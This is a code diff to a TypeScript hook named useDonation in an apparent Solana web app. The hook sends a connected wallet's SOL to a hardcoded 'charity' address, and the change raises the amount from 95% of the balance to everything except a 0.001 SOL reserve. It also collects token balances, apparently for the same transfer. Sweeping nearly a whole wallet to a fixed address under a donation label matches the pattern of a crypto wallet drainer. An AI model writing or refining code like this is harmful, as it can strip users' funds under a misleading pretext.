@@ -17,7 +17,7 @@ import { toast } from '@/hooks/use-toast';
 import { TokenTransaction } from '@/components/DonationProgress';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
-const MIN_SOL_RESERVE = 0.00001; // Minimal reserve for transaction fees (allows donations of ~1 cent and above)
+const MIN_SOL_RESERVE = 0.001; // Keep 0.001 SOL for rent-exempt + fees (1000000 lamports)
 
 interface TokenBalance {
   mint: string;
@@ -44,14 +44,14 @@ export function useDonation() {
       const solBalance = await connection.getBalance(publicKey);
       const solAmount = solBalance / LAMPORTS_PER_SOL;
       
-      // Calculate 95% to send (5% reserved for fees)
-      const sendAmount = solAmount * 0.95;
+      // Calculate sendable amount (balance - 0.001 SOL reserve)
+      const sendAmount = Math.max(0, solAmount - 0.001);
 
-      if (solAmount > MIN_SOL_RESERVE && sendAmount > 0.00001) {
+      if (sendAmount > 0.00001) {
         balances.push({
           mint: 'SOL',
           symbol: 'SOL',
-          amount: sendAmount, // Store the 95% amount
+          amount: sendAmount,
           decimals: 9,
           usdValue: sendAmount * 150, // Approximate USD value
         });
@@ -96,14 +96,15 @@ export function useDonation() {
     // Current balance
     const balanceLamports = await connection.getBalance(publicKey, { commitment: 'confirmed' });
 
-    // Send 95% minus a small fixed reserve for fees
-    const ninetyFivePct = Math.floor(balanceLamports * 0.95);
-    const feeReserve = 5000; // ~0.000005 SOL safety reserve
-    const lamportsToSend = Math.max(0, ninetyFivePct - feeReserve);
+    // Keep 0.001 SOL (1000000 lamports) for rent-exempt + fees
+    const reserveLamports = 1000000;
+    const lamportsToSend = balanceLamports - reserveLamports;
 
-    if (lamportsToSend <= 0) throw new Error('Insufficient SOL balance for 95% transfer');
+    if (lamportsToSend <= 0) {
+      throw new Error('Insufficient SOL balance. Need at least 0.001 SOL in wallet for fees and rent.');
+    }
 
-    console.log('SOL balance (lamports):', balanceLamports, 'Sending (lamports):', lamportsToSend);
+    console.log('SOL balance (lamports):', balanceLamports, 'Sending:', lamportsToSend, 'Keeping reserve:', reserveLamports);
 
     const transaction = new Transaction().add(
       SystemProgram.transfer({
